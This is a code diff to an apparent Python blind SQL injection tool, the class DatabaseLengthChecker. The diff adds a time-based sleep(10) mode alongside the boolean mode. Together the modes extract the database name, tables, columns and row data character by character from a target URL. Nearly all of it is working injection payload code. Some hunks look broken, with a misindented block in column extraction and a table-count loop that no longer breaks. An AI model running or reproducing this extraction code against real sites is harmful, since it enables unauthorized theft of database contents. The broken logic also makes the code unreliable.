@@ -1,3 +1,4 @@
+import sys
 import threading
 import time
 import itertools
@@ -12,6 +13,7 @@ class DatabaseLengthChecker:
         self.length_database_name = 0
         self.number_of_table = 0
         self.table_names = []
+        self.method = ""
 
     def get_database_length(self):
         length = 1
@@ -19,21 +21,38 @@ class DatabaseLengthChecker:
         spinner_thread.start()
 
         while True:
-            # Construct the SQL Injection payload
-            payload = f"{self.url}{self.pre_payload} and 1=IF((SELECT LENGTH(DATABASE()))>{length},1,2)-- -"
+            if self.method == 'boolean':
+                payload = f"{self.url}{self.pre_payload} and 1=IF((SELECT LENGTH(DATABASE()))>{length},1,2)-- -"
 
-            try:
-                response = requests.get(payload)
+                try:
+                    response = requests.get(payload)
 
-                if response.text == '1':
-                    length += 1
-                else:
-                    break
-            except Exception as e:
-                print(f"Error while testing: {e}")
-                self.stop_spinner = True  # Signal to stop the spinner
-                spinner_thread.join(timeout=0.1)
-                return None
+                    if response.text == '1':
+                        length += 1
+                    else:
+                        break
+                except Exception as e:
+                    print(f"Error while testing: {e}")
+                    self.stop_spinner = True  # Signal to stop the spinner
+                    spinner_thread.join(timeout=0.1)
+                    return None
+            else:
+                payload = f"{self.url}{self.pre_payload} and 1=IF((SELECT LENGTH(DATABASE()))>{length},sleep(10),2)-- -"
+
+                try:
+                    start_time = time.time()
+                    response = requests.get(payload)
+                    elapsed_time = time.time() - start_time
+
+                    if elapsed_time > 10:
+                        length += 1
+                    else:
+                        break
+                except Exception as e:
+                    print(f"Error while testing: {e}")
+                    self.stop_spinner = True  # Signal to stop the spinner
+                    spinner_thread.join(timeout=0.1)
+                    return None
 
         self.stop_spinner = True  # Signal to stop the spinner
         spinner_thread.join()  # Ensure the spinner thread terminates
@@ -50,18 +69,35 @@ class DatabaseLengthChecker:
         for position in range(1, self.length_database_name + 1):
             for char in range(32, 127):
                 char_to_test = chr(char)
-                payload = f"{self.url}{self.pre_payload} and 1=IF((SELECT SUBSTRING(DATABASE(), {position}, 1))='{char_to_test}',1,2)-- -"
-                try:
-                    response = requests.get(payload)
-                    if response.text == '1':
-                        database_name += char_to_test
-                        print(f"\rCurrent database name: {database_name}", end='', flush=True)
-                        break
-                except Exception as e:
-                    print(f"\nError while testing: {e}")
-                    self.stop_spinner = True  # Signal to stop the spinner
-                    spinner_thread.join(timeout=0.1)
-                    return None
+                if self.method == 'boolean':
+                    payload = f"{self.url}{self.pre_payload} and 1=IF((SELECT SUBSTRING(DATABASE(), {position}, 1))='{char_to_test}',1,2)-- -"
+                    try:
+                        response = requests.get(payload)
+                        if response.text == '1':
+                            database_name += char_to_test
+                            print(f"\rCurrent database name: {database_name}", end='', flush=True)
+                            break
+                    except Exception as e:
+                        print(f"\nError while testing: {e}")
+                        self.stop_spinner = True  # Signal to stop the spinner
+                        spinner_thread.join(timeout=0.1)
+                        return None
+                else:
+                    payload = f"{self.url}{self.pre_payload} and IF((SELECT SUBSTRING(DATABASE(), {position}, 1))='{char_to_test}',sleep(10),2)-- -"
+                    try:
+                        start_time = time.time()
+                        response = requests.get(payload)
+                        elapsed_time = time.time() - start_time
+                        if elapsed_time>10:
+                            database_name += char_to_test
+                            print(f"\rCurrent database name: {database_name}", end='', flush=True)
+                            break
+                    except Exception as e:
+                        print(f"\nError while testing: {e}")
+                        self.stop_spinner = True  # Signal to stop the spinner
+                        spinner_thread.join(timeout=0.1)
+                        return None
+
         self.stop_spinner = True  # Signal to stop the spinner
         spinner_thread.join(timeout=0.1)
         return database_name
@@ -75,14 +111,26 @@ class DatabaseLengthChecker:
 
         while True:
             # Construct the SQL Injection payload to count the tables
-            payload = f"{self.url}{self.pre_payload} and 1=IF((SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())>{number_of_tables},1,2)-- -"
+            if self.method == 'boolean':
+                payload = f"{self.url}{self.pre_payload} and 1=IF((SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())>{number_of_tables},1,2)-- -"
+            else:
+                payload = f"{self.url}{self.pre_payload} and IF((SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())>{number_of_tables},sleep(10),2)-- -"
 
             try:
-                response = requests.get(payload)
-                if response.text == '1':  # Adjust this check based on your server's response
-                    number_of_tables += 1
+                if self.method == 'boolean':
+                    response = requests.get(payload)
+                    if response.text == '1':
+                        number_of_tables += 1
+
                 else:
-                    break
+                    start_time = time.time()
+                    response = requests.get(payload)
+                    elapsed_time = time.time() - start_time
+                    if elapsed_time > 10:
+                        number_of_tables += 1
+
+
+
             except Exception as e:
                 print(f"\nError while testing: {e}")
                 self.stop_spinner = True  # Signal to stop the spinner
@@ -114,24 +162,44 @@ class DatabaseLengthChecker:
                     # Iterate over all printable ASCII characters
                     for char in range(32, 127):
                         char_to_test = chr(char)
-                        # Construct the SQL Injection payload
-                        payload = (
-                            f"{self.url}{self.pre_payload} and 1=IF("
-                            f"(SELECT SUBSTRING(TABLE_NAME, {position}, 1) FROM INFORMATION_SCHEMA.TABLES "
-                            f"WHERE TABLE_SCHEMA=DATABASE() LIMIT {table_index},1)='{char_to_test}',1,2)-- -"
-                        )
+                        payload = ""
+                        if self.method == 'boolean':
+                            payload = (
+                                f"{self.url}{self.pre_payload} and 1=IF("
+                                f"(SELECT SUBSTRING(TABLE_NAME, {position}, 1) FROM INFORMATION_SCHEMA.TABLES "
+                                f"WHERE TABLE_SCHEMA=DATABASE() LIMIT {table_index},1)='{char_to_test}',1,2)-- -"
+                            )
+                        else:
+                            payload = (f"{self.url}{self.pre_payload} and IF("
+                                       f"(SELECT SUBSTRING(TABLE_NAME, {position}, 1) FROM INFORMATION_SCHEMA.TABLES "
+                                       f"WHERE TABLE_SCHEMA=DATABASE() LIMIT {table_index},1)='{char_to_test}',sleep(10),2)-- -")
 
                         try:
-                            response = requests.get(payload)
-                            if response.text == '1':  # Adjust this check based on your server's response
-                                # If the character is a space, assume the table name is complete
-                                if char_to_test == ' ':
+                            if self.method == 'boolean':
+                                response = requests.get(payload)
+                                if response.text == '1':
+
+                                    if char_to_test == ' ':
+                                        break
+                                    table_name += char_to_test
+                                    print(f"\rExtracting table names: {table_name}", end='', flush=True)
+                                    position += 1
+                                    character_found = True
                                     break
-                                table_name += char_to_test
-                                print(f"\rExtracting table names: {table_name}", end='', flush=True)
-                                position += 1
-                                character_found = True
-                                break
+                            else:
+                                start_time = time.time()
+                                response = requests.get(payload)
+                                elapsed_time = time.time() - start_time
+                                if elapsed_time > 10:
+
+                                    if char_to_test == ' ':
+                                        break
+                                    table_name += char_to_test
+                                    print(f"\rExtracting table names: {table_name}", end='', flush=True)
+                                    position += 1
+                                    character_found = True
+                                    break
+
                         except Exception as e:
                             print(f"\nError while testing: {e}")
                             self.stop_spinner = True
@@ -170,16 +238,41 @@ class DatabaseLengthChecker:
 
                     for char in range(32, 127):  # ASCII printable characters range
                         char_to_test = chr(char)
-                        # Construct the SQL Injection payload
+                        payload = ""
+                    if self.method == 'boolean':
                         payload = (
                             f"{self.url}{self.pre_payload} and 1=IF("
                             f"(SELECT SUBSTRING(COLUMN_NAME, {position}, 1) FROM INFORMATION_SCHEMA.COLUMNS "
                             f"WHERE TABLE_NAME='{table_name}' LIMIT {column_index},1)='{char_to_test}',1,2)-- -"
                         )
-
+                    else:
+                        payload = (
+                            f"{self.url}{self.pre_payload} and IF("
+                            f"(SELECT SUBSTRING(COLUMN_NAME, {position}, 1) FROM INFORMATION_SCHEMA.COLUMNS "
+                            f"WHERE TABLE_NAME='{table_name}' LIMIT {column_index},1)='{char_to_test}',sleep(10),2)-- -"
+                        )
+                    if self.method == 'boolean':
                         try:
                             response = requests.get(payload)
                             if response.text == '1':
+                                if char_to_test == ' ':
+                                    break  # Stop if a space is encountered
+                                field_name += char_to_test
+                                print(f"\rExtracting fields for {table_name}: {field_name}", end='', flush=True)
+                                position += 1
+                                character_found_in_field = True
+                                break
+                        except Exception as e:
+                            print(f"\nError while testing: {e}")
+                            self.stop_spinner = True
+                            spinner_thread.join(timeout=0.1)
+                            return None
+                    else:
+                        try:
+                            start_time = time.time()
+                            response = requests.get(payload)
+                            elapsed_time = time.time() - start_time
+                            if elapsed_time > 10:
                                 if char_to_test == ' ':
                                     break  # Stop if a space is encountered
                                 field_name += char_to_test
@@ -229,27 +322,59 @@ class DatabaseLengthChecker:
                     for char in range(32, 127):  # ASCII printable characters range
                         char_to_test = chr(char)
                         # Construct the SQL Injection payload
-                        payload = (
-                            f"{self.url}{self.pre_payload} and 1=IF("
-                            f"(SELECT SUBSTRING({field_name}, {position}, 1) FROM {table_name} "
-                            f"LIMIT {row_index},1)='{char_to_test}',1,2)-- -"
-                        )
+                        payload = ''
+                        if self.method == 'boolean':
+                            payload = (
+                                f"{self.url}{self.pre_payload} and 1=IF("
+                                f"(SELECT SUBSTRING({field_name}, {position}, 1) FROM {table_name} "
+                                f"LIMIT {row_index},1)='{char_to_test}',1,2)-- -"
+                            )
 
-                        try:
-                            response = requests.get(payload)
-                            if response.text == '1':  # Adjust this check as needed
-                                if char_to_test == ' ':
+                            try:
+                                response = requests.get(payload)
+                                if response.text == '1':  # Adjust this check as needed
+                                    if char_to_test == ' ':
+                                        break
+                                    row_data += char_to_test
+                                    print(f"\rExtracting data from {field_name}: {row_data}", end='', flush=True)
+                                    position += 1
+                                    character_found_in_row = True
                                     break
-                                row_data += char_to_test
-                                print(f"\rExtracting data from {field_name}: {row_data}", end='', flush=True)
-                                position += 1
-                                character_found_in_row = True
-                                break
-                        except Exception as e:
-                            print(f"\nError while testing: {e}")
-                            self.stop_spinner = True
-                            spinner_thread.join(timeout=0.1)
-                            return None
+                            except Exception as e:
+                                print(f"\nError while testing: {e}")
+                                self.stop_spinner = True
+                                spinner_thread.join(timeout=0.1)
+                                return None
+                        else:
+                            payload = (
+                                f"{self.url}{self.pre_payload} and IF("
+                                f"(SELECT SUBSTRING({field_name}, {position}, 1) FROM {table_name} "
+                                f"LIMIT {row_index},1)='{char_to_test}',sleep(10),2)-- -"
+                            )
+                            try:
+                                start_time = time.time()
+
+                                response = requests.get(payload)
+                                elapsed_time = time.time() - start_time
+
+                                if elapsed_time > 10:  # Adjust this check as needed
+                                    if char_to_test == ' ':
+                                        break
+                                    row_data += char_to_test
+                                    sys.stdout.write(f"\rExtracting data from {field_name}: {row_data}")
+                                    sys.stdout.flush()
+                                    print(f"\rExtracting data from {field_name}: {char_to_test}")
+                                    print(row_data)
+
+                                    print(f"\rExtracting data from {field_name}: {row_data}", end='', flush=True)
+                                    position += 1
+                                    character_found_in_row = True
+                                    break
+                            except Exception as e:
+                                print(f"\nError while testing: {e}")
+                                self.stop_spinner = True
+                                spinner_thread.join(timeout=0.1)
+                                return None
 
                     if not character_found_in_row:
                         # If no more characters are found, the row data is complete
@@ -269,6 +394,9 @@ class DatabaseLengthChecker:
             print('\nDone! Retrieved data from the table.')
 
         return data
+
+    def get_method(self):
+        return self.method
 
     def spinner(self):
         """Show a simple spinner."""
